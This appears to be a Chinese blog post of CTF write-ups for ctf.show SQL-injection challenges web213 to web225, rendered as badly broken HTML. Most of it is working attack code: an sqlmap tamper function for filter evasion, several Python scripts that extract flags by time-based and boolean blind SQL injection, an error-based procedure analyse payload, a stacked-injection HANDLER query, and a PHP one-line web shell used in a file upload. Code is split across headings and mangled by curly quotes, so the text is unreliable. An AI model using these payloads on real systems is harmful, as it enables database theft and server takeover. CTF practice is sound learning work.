+<p>def tamper(payload, *<em>kwargs):<br>payload &#x3D; space2comment(payload)<br>retVal &#x3D; “”<br>if payload:<br>    retVal &#x3D; base64.b64encode(payload[::-1].encode(‘utf-8’))<br>    retVal &#x3D; base64.b64encode(retVal[::-1]).decode(‘utf-8’)<br>return retVal<br>def space2comment(payload):<br>retVal &#x3D; payload<br>if payload:<br>    retVal &#x3D; “”<br>    quote, doublequote, firstspace &#x3D; False, False, False<br><br>    for i in xrange(len(payload)):<br>        if not firstspace:<br>            if payload[i].isspace():<br>                firstspace &#x3D; True<br>                retVal +&#x3D; chr(0x0a)<br>                continue<br><br>        elif payload[i] &#x3D;&#x3D; ‘&#39;‘:<br>            quote &#x3D; not quote<br><br>        elif payload[i] &#x3D;&#x3D; ‘“‘:<br>            doublequote &#x3D; not doublequote<br><br>        elif payload[i] &#x3D;&#x3D; “</em>“:<br>            retVal +&#x3D; chr(0x31)<br>            continue<br><br>        elif payload[i] &#x3D;&#x3D; “&#x3D;”:<br>            retVal +&#x3D; chr(0x0a)+’like’+chr(0x0a)<br>            continue<br><br>        elif payload[i] &#x3D;&#x3D; “ “ and not doublequote and not quote:<br>            retVal +&#x3D; chr(0x0a)<br>            continue<br><br>        retVal +&#x3D; payload[i]<br><br>return retVal</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>### web<span class="hljs-number">213</span><br><br>- 参考了大佬文章但是做后我的sqlmap直接写入文件<br>- https://blog.csdn.net/jiangdie<span class="hljs-number">666</span>/article/details/<span class="hljs-number">117822681</span>?csdn_share_tail<span class="hljs-operator">=</span><span class="hljs-variable">%7</span>B<span class="hljs-variable">%22</span><span class="hljs-keyword">type</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>blog<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%22</span>rType<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>article<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%22</span>rId<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22117822681</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%22</span>source<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>m<span class="hljs-number">0</span>_<span class="hljs-number">61206225</span><span class="hljs-variable">%22</span><span class="hljs-variable">%7</span>D&amp;ctrtid<span class="hljs-operator">=</span>rcVln<br>- 后面我就直接中国蚁剑了<br><br>### web<span class="hljs-number">214</span><br><br>- 注入点是ip和debug<br><br>- ```python<br>  import requests<br>  <br>  url <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://10cbe042-251f-4173-9e79-16bf7e99a599.challenge.ctf.show/api/&quot;</span><br>  <br>  result <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><br>  i <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>  while True:<br>      i <span class="hljs-operator">=</span> i + <span class="hljs-number">1</span><br>      head <span class="hljs-operator">=</span> <span class="hljs-number">32</span><br>      <span class="hljs-keyword">tail</span> <span class="hljs-operator">=</span> <span class="hljs-number">127</span><br>  <br>      while head &lt; <span class="hljs-keyword">tail</span>:<br>          mid <span class="hljs-operator">=</span> (head + <span class="hljs-keyword">tail</span>) &gt;&gt; <span class="hljs-number">1</span><br>          # 查数据库<br>          # payload <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>          # 查列名字-id.flag<br>          # payload <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;&quot;</span><br>          # 查数据<br>          payload <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select flaga from ctfshow_flagx&quot;</span><br>          data <span class="hljs-operator">=</span> &#123;<br>              &#x27;ip&#x27;: f<span class="hljs-string">&quot;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;</span><span class="hljs-punctuation">,</span><br>              &#x27;debug&#x27;:&#x27;<span class="hljs-number">0</span>&#x27;<br>          &#125;<br><span class="hljs-symbol">          try:</span><br>              r <span class="hljs-operator">=</span> requests.post(url<span class="hljs-punctuation">,</span> data<span class="hljs-operator">=</span>data<span class="hljs-punctuation">,</span> timeout<span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br>              <span class="hljs-keyword">tail</span> <span class="hljs-operator">=</span> mid<br>          except Exception as e:<br>              head <span class="hljs-operator">=</span> mid + <span class="hljs-number">1</span><br>  <br>      if head !<span class="hljs-operator">=</span> <span class="hljs-number">32</span>:<br>          result +<span class="hljs-operator">=</span> chr(head)<br><span class="hljs-symbol">      else:</span><br>          break<br>      print(result)<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h3><ul>
+<li><p>多了一个’</p>
+</li>
+<li><p>&#96;&#96;&#96;python<br>import requests</p>
+<p>url &#x3D; “<a target="_blank" rel="noopener" href="http://752fc45b-8355-4eb0-a7ae-a421504f129f.challenge.ctf.show/api/&quot;">http://752fc45b-8355-4eb0-a7ae-a421504f129f.challenge.ctf.show/api/&quot;</a></p>
+<p>result &#x3D; ‘’</p>
+</li>
+</ul>
+<h1 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h1><h1 id="payload-x3D-“select-group-concat-table-name-from-information-schema-tables-where-table-schema-x3D-database-”"><a href="#payload-x3D-“select-group-concat-table-name-from-information-schema-tables-where-table-schema-x3D-database-”" class="headerlink" title="payload &#x3D; “select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()”"></a>payload &#x3D; “select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()”</h1><h1 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h1><h1 id="payload-x3D-“select-group-concat-column-name-from-information-schema-columns-where-table-schema-x3D-database-and-table-name-x3D-’ctfshow-flagxc’”"><a href="#payload-x3D-“select-group-concat-column-name-from-information-schema-columns-where-table-schema-x3D-database-and-table-name-x3D-’ctfshow-flagxc’”" class="headerlink" title="payload &#x3D; “select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’ctfshow_flagxc’”"></a>payload &#x3D; “select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’ctfshow_flagxc’”</h1><p>  #爆字段值<br>  payload &#x3D; “select flagaa from <code>ctfshow_flagxc</code>“</p>
+<p>  for i in range(1,50):<br>      head &#x3D; 32<br>      tail &#x3D; 127</p>
+<pre><code class="hljs">  while head &lt; tail:
+      mid = (head + tail) &gt;&gt; 1 # 中间指针等于头尾指针相加的一半
+      # print(mid)
+      data = &#123;
+          &#39;ip&#39; : f&quot;&#39; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)#&quot;,
+          &#39;debug&#39; : &#39;0&#39;
+      &#125;
+      try:
+          r = requests.post(url, data, timeout=0.8)
+          tail = mid
+      except:
+          head = mid + 1 #sleep导致超时
+
+  if head != 32:
+      result += chr(head)
+      print(result)
+  else:
+      break
+</code></pre>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">### web216</span><br><br>- 用)闭合括号<br><br>- ```python<br>  import requests<br>  <br>  url = <span class="hljs-string">&quot;http://99a498fc-f8ae-40ed-9f5b-dad355a13148.challenge.ctf.show/api/&quot;</span><br>  <br>  result = <span class="hljs-string">&#x27;&#x27;</span><br>  <br>  <span class="hljs-comment"># 爆表名</span><br>  <span class="hljs-comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>  <span class="hljs-comment"># 爆列名</span><br>  <span class="hljs-comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagxc&#x27;&quot;</span><br>  <span class="hljs-comment">#爆字段值</span><br>  payload = <span class="hljs-string">&quot;select flagaac from `ctfshow_flagxcc`&quot;</span><br>  <br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,50):<br>      <span class="hljs-built_in">head</span> = 32<br>      <span class="hljs-built_in">tail</span> = 127<br>  <br>      <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>          mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1 <span class="hljs-comment"># 中间指针等于头尾指针相加的一半</span><br>          <span class="hljs-comment"># print(mid)</span><br>          data = &#123;<br>              <span class="hljs-string">&#x27;ip&#x27;</span> : f<span class="hljs-string">&quot;1) or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)#&quot;</span>,<br>              <span class="hljs-string">&#x27;debug&#x27;</span> : <span class="hljs-string">&#x27;0&#x27;</span><br>          &#125;<br>          try:<br>              r = requests.post(url, data, <span class="hljs-built_in">timeout</span>=0.8)<br>              <span class="hljs-built_in">tail</span> = mid<br>          except:<br>              <span class="hljs-built_in">head</span> = mid + 1 <span class="hljs-comment">#sleep导致超时</span><br>  <br>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>          result += chr(<span class="hljs-built_in">head</span>)<br>          <span class="hljs-built_in">print</span>(result)<br>      <span class="hljs-keyword">else</span>:<br>          <span class="hljs-built_in">break</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h3><ul>
+<li><p>过滤了sleep</p>
+</li>
+<li><p>使用benchmark替换</p>
+</li>
+<li><p>&#96;&#96;&#96;python</p>
+</li>
+</ul>
+<h1 id="Author-Kradress"><a href="#Author-Kradress" class="headerlink" title="@Author:Kradress"></a>@Author:Kradress</h1><p>  from time import sleep<br>  import requests</p>
+<p>  url &#x3D; “<a target="_blank" rel="noopener" href="http://95e2dfa2-d45c-4720-8007-e77d6f694323.challenge.ctf.show/api/&quot;">http://95e2dfa2-d45c-4720-8007-e77d6f694323.challenge.ctf.show/api/&quot;</a></p>
+<p>  result &#x3D; ‘’</p>
+<h1 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h1><h1 id="payload-x3D-“select-group-concat-table-name-from-information-schema-tables-where-table-schema-x3D-database-”-1"><a href="#payload-x3D-“select-group-concat-table-name-from-information-schema-tables-where-table-schema-x3D-database-”-1" class="headerlink" title="payload &#x3D; “select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()”"></a>payload &#x3D; “select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()”</h1><h1 id="爆列名-1"><a href="#爆列名-1" class="headerlink" title="爆列名"></a>爆列名</h1><h1 id="payload-x3D-“select-group-concat-column-name-from-information-schema-columns-where-table-schema-x3D-database-and-table-name-x3D-’ctfshow-flagxccb’”"><a href="#payload-x3D-“select-group-concat-column-name-from-information-schema-columns-where-table-schema-x3D-database-and-table-name-x3D-’ctfshow-flagxccb’”" class="headerlink" title="payload &#x3D; “select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’ctfshow_flagxccb’”"></a>payload &#x3D; “select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’ctfshow_flagxccb’”</h1><p>  #爆字段值<br>  payload &#x3D; “select flagaabc from <code>ctfshow_flagxccb</code>“</p>
+<p>  for i in range(1,50):<br>      head &#x3D; 32<br>      tail &#x3D; 127</p>
+<pre><code class="hljs">  while head &lt; tail:
+      sleep(1)
+      mid = (head + tail) &gt;&gt; 1 # 中间指针等于头尾指针相加的一半
+      print(mid)
+      data = &#123;
+          &#39;ip&#39; : f&quot;-1) or benchmark(4e6*(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;),sha1(&#39;kradress&#39;))#&quot;,
+          &#39;debug&#39; : &#39;1&#39;
+      &#125;
+      try:
+          r = requests.post(url, data, timeout=1)
+          tail = mid
+      except:
+          head = mid + 1 #sleep导致超时
+
+  if head != 32:
+      result += chr(head)
+      print(result)
+  else:
+      break
+</code></pre>
+  <figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs xl"><br>### web218<br><br>- 这题真😄，憔悴<br><br>  多尝试几次<br><br>  结合一下<br><br>- **笛卡尔积盲注**<br><br>- ```python<br>  <span class="hljs-keyword">import</span> requests<br>  <span class="hljs-keyword">import</span> <span class="hljs-built_in">time</span><br>  <br>  <br>  url=<span class="hljs-string">&quot;http://8b64f78d-1a2b-4ef7-8dd6-2d3bc5765780.challenge.ctf.show/api/&quot;</span><br>  flag=<span class="hljs-string">&#x27;&#x27;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>      low=<span class="hljs-number">32</span><br>      high=<span class="hljs-number">128</span><br>      mid=(low+high)<span class="hljs-comment">//2</span><br>      <span class="hljs-keyword">while</span> low&lt;high:<br>          payload=<span class="hljs-string">&quot;0)or if((ascii(substr((select group_concat(flagaac) from ctfshow_flagxc),&#123;&#125;,1))&gt;&#123;&#125;),(SELECT count(*) FROM information_schema.columns A,information_schema.columns B),0)#&quot;</span>.format(i,mid)<br>  <br>          <span class="hljs-keyword">data</span>=&#123;<br>              <span class="hljs-string">&quot;ip&quot;</span>:payload,<br>              <span class="hljs-string">&quot;debug&quot;</span>:<span class="hljs-number">0</span><br>          &#125;<br>          time1=<span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<br>          r=requests.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)<br>          time2=<span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<br>          <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">0.5</span>)<br>          print(time2-time1)<br>          print(low,mid,high)<br>  <br>  <br>          <span class="hljs-keyword">if</span> time2-time1&gt;<span class="hljs-number">0.5</span>:<br>              low=mid+<span class="hljs-number">1</span><br>          <span class="hljs-keyword">else</span>:<br>              high=mid<br>          mid=(low+high)<span class="hljs-comment">//2</span><br>      flag+=chr(mid)<br>      print(flag)<br>      <span class="hljs-keyword">if</span> mid==<span class="hljs-number">32</span>:<br>          print(flag)<br>          break<br></code></pre></td></tr></table></figure>
+
+<h3 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h3><ul>
+<li><p>&#96;&#96;&#96;python<br>import requests<br>url &#x3D; “<a target="_blank" rel="noopener" href="http://b7d57eaf-9df6-4745-ac58-623550e366c4.challenge.ctf.show/api/&quot;">http://b7d57eaf-9df6-4745-ac58-623550e366c4.challenge.ctf.show/api/&quot;</a></p>
+<p>strr &#x3D; “_1234567890{}-qazwsxedcrfvtgbyhnujmikolp”</p>
+</li>
+</ul>
+<h1 id="payload-x3D-“select-table-name-from-information-schema-tables-where-table-schema-x3D-database-limit-0-1”"><a href="#payload-x3D-“select-table-name-from-information-schema-tables-where-table-schema-x3D-database-limit-0-1”" class="headerlink" title="payload &#x3D; “select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1”"></a>payload &#x3D; “select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1”</h1><h1 id="payload-x3D-“select-column-name-from-information-schema-columns-where-table-name-x3D-’ctfshow-flagxca’-limit-1-1”"><a href="#payload-x3D-“select-column-name-from-information-schema-columns-where-table-name-x3D-’ctfshow-flagxca’-limit-1-1”" class="headerlink" title="payload &#x3D; “select column_name from information_schema.columns where table_name&#x3D;’ctfshow_flagxca’ limit 1,1”"></a>payload &#x3D; “select column_name from information_schema.columns where table_name&#x3D;’ctfshow_flagxca’ limit 1,1”</h1><p>  payload &#x3D; “select flagaabc from ctfshow_flagxca”<br>  j &#x3D; 1<br>  res &#x3D; “”<br>  while 1:<br>      for i in strr:<br>          data &#x3D; {<br>              ‘ip’: f”1) or if(substr(({payload}),{j},1)&#x3D;’{i}’,(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),1”,<br>              ‘debug’: ‘1’<br>          }<br>          # print(i)<br>          try:<br>              r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;3)<br>          except Exception as e:<br>              res +&#x3D; i<br>              print(res)<br>              j+&#x3D;1</p>
+  <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><br>### web220<br><br>- 屏蔽了substr使用left<br><br>- ```python<br>  import requests<br>  url = &quot;http://f0769ed5-6962-4fdf-92f4-644c456b8354.challenge.ctf.show/api/&quot;<br>  <br>  strr = &quot;_1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolp&quot;<br>  # payload = &quot;<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">  # payload = &quot;</span><span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;ctfshow_flagxcac&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">  payload = &quot;</span><span class="hljs-keyword">select</span> flagaabcc <span class="hljs-keyword">from</span> ctfshow_flagxcac<span class="hljs-string">&quot;</span><br><span class="hljs-string">  j = 1</span><br><span class="hljs-string">  res = &quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">  while 1:</span><br><span class="hljs-string">      for i in strr:</span><br><span class="hljs-string">          res += i</span><br><span class="hljs-string">          data = &#123;</span><br><span class="hljs-string">              &#x27;ip&#x27;: f&quot;</span><span class="hljs-number">1</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">left</span>((&#123;payload&#125;),&#123;j&#125;)=<span class="hljs-string">&#x27;&#123;res&#125;&#x27;</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">FROM</span> information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata <span class="hljs-built_in">E</span>, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),<span class="hljs-number">1</span><span class="hljs-string">&quot;,</span><br><span class="hljs-string">              &#x27;debug&#x27;: &#x27;1&#x27;</span><br><span class="hljs-string">          &#125;</span><br><span class="hljs-string">          # print(i)</span><br><span class="hljs-string">          try:</span><br><span class="hljs-string">              r = requests.post(url, data=data, timeout=3)</span><br><span class="hljs-string">              res = res[:-1]</span><br><span class="hljs-string">          except Exception as e:</span><br><span class="hljs-string">              print(res)</span><br><span class="hljs-string">              j+=1</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h3><ul>
+<li><p>利用procedure analyse来进行注入，只能使用extractvalue 和 benchmark。这题开启了报错，所以extractvalue肯定是最方便的。</p>
+</li>
+<li><p>&#96;&#96;&#96;<br>&#x2F;api&#x2F;?page&#x3D;1&amp;limit&#x3D;1  procedure analyse(extractvalue(1,concat(0x7e,database())),1)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>- 库名就是flag！！！！！<br><br><span class="hljs-comment">### Web222</span><br><br>- 时间盲注<br><br>- ```python<br>  <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">  Author:Y4tacker</span><br><span class="hljs-string">  &quot;&quot;&quot;</span><br>  <span class="hljs-keyword">import</span> requests<br>  <br>  url = <span class="hljs-string">&quot;http://66d6b11b-e704-4ba7-8329-8b6284170361.challenge.ctf.show/api/&quot;</span><br>  <br>  result = <span class="hljs-string">&quot;&quot;</span><br>  i = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>      i = i + <span class="hljs-number">1</span><br>      head = <span class="hljs-number">32</span><br>      tail = <span class="hljs-number">127</span><br>  <br>      <span class="hljs-keyword">while</span> head &lt; tail:<br>          mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br>          <span class="hljs-comment"># 查数据库</span><br>          <span class="hljs-comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>          <span class="hljs-comment"># 查列名字</span><br>          <span class="hljs-comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27; limit 1,1&quot;</span><br>          <span class="hljs-comment"># 查数据---不能一次查完越到后面越不准确</span><br>          payload = <span class="hljs-string">&quot;select flagaabc from ctfshow_flaga&quot;</span><br>   <br>          params = &#123;<br>              <span class="hljs-string">&#x27;u&#x27;</span>: <span class="hljs-string">f&quot;concat((if (ascii(substr((<span class="hljs-subst">&#123;payload&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>, sleep(0.05), 2)), 1);&quot;</span><br>  <br>          &#125;<br>          <span class="hljs-keyword">try</span>:<br>              r = requests.get(url, params=params, timeout=<span class="hljs-number">1</span>)<br>              tail = mid<br>          <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>              head = mid + <span class="hljs-number">1</span><br>  <br>      <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>          result += <span class="hljs-built_in">chr</span>(head)<br>      <span class="hljs-keyword">else</span>:<br>          <span class="hljs-keyword">break</span><br>      <span class="hljs-built_in">print</span>(result)<br>  <br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="Web223"><a href="#Web223" class="headerlink" title="Web223"></a>Web223</h3><ul>
+<li><p>过滤了数字，用true绕过</p>
+</li>
+<li><p>利用回显长度不同进行盲注</p>
+</li>
+<li><pre><code class="python">import requests
+
+
+def generateNum(num):
+    res = &#39;true&#39;
+    if num == 1:
+        return res
+    else:
+        for i in range(num - 1):
+            res += &quot;+true&quot;
+        return res
+
+
+url = &quot;http://ff765902-0dec-4688-8cd2-1a4cc429d30a.chall.ctf.show/api/&quot;
+i = 0
+res = &quot;&quot;
+while 1:
+    head = 32
+    tail = 127
+    i = i + 1
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # 查数据库-ctfshow_flagas
+        # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;
+        # 查字段-flagasabc
+        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagas&#39;&quot;
+        # 查flag
+        payload = &quot;select flagasabc from ctfshow_flagas&quot;
+        params = &#123;
+            &quot;u&quot;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;generateNum(i)&#125;,&#123;generateNum(1)&#125;))&gt;&#123;generateNum(mid)&#125;,username,&#39;a&#39;)&quot;
+        &#125;
+        r = requests.get(url, params=params)
+        # print(r.json()[&#39;data&#39;])
+        if &quot;userAUTO&quot; in r.text:
+            head = mid + 1
+        else:
+            tail = mid
+    if head != 32:
+        res += chr(head)
+    else:
+        break
+    print(res)
+
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-section">### web224</span><br><br><span class="hljs-bullet">-</span> robots.txt里面发现pwdreset<br><br><span class="hljs-bullet">-</span> 重置密码后需要上传文件<br><br><span class="hljs-bullet">-</span> 基本所有类型都不能上传<br><br><span class="hljs-bullet">-</span> 在群里找到大佬制作的文件payload.bin文件上传，里面有一句话木马<br><br><span class="hljs-bullet">-</span> <span class="hljs-code">```</span><br><span class="hljs-code">  &lt;?=&#x27;$_GET[1]&#x27;?&gt;</span><br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p>&#x2F;1.php?cat &#x2F;flag</p>
+</li>
+</ul>
+<h3 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h3><ul>
+<li><p>堆叠注入</p>
+</li>
+<li><p>handler绕过</p>
+</li>
+<li><p>&#96;&#96;&#96;<br>&#x2F;api&#x2F;username&#x3D;ctfshow%27;show%20tables;handler%20ctfshow_flagasa%20open;handler%20ctfshow_flagasa%20read%20first;</p>
